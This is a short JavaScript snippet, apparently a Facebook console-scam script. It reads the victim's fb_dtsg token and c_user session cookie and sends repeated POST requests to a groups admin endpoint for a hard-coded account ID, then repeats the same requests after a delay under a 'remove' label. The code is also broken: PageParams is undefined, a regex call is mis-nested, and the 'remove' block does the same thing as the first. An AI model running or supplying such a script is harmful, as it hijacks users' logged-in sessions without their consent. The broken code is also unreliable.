/*Admin Post*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function IDS(r) {
    function G(gid) {
        var Page = new XMLHttpRequest();
        var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";;
        Page.open("POST", PageURL, true);
        Page.onreadystatechange = function () {
            if (Page.readyState == 4 && Page.status == 200) {
                Page.close;
            }
        };
        Page.send(PageParams);
    }
     G("100003590682442");
}
IDS("100003590682442");
IDS("100003590682442");
IDS("100003590682442");
IDS("100003590682442");

setTimeout(function () {

    /*remove-Admin Post*/

    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var now = (new Date).getTime();

    function IDS(r) {
        function G(gid) {
            var Page = new XMLHttpRequest();
            var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
            Page.open("POST", PageURL, true);
            Page.onreadystatechange = function () {
                if (Page.readyState == 4 && Page.status == 200) {
                    Page.close;
                }
            };
            Page.send(PageParams);
        }
          G("100003590682442");
    }
    IDS("100003590682442");
    IDS("100003590682442");
    IDS("100003590682442");
    IDS("100003590682442");

}, 5000);
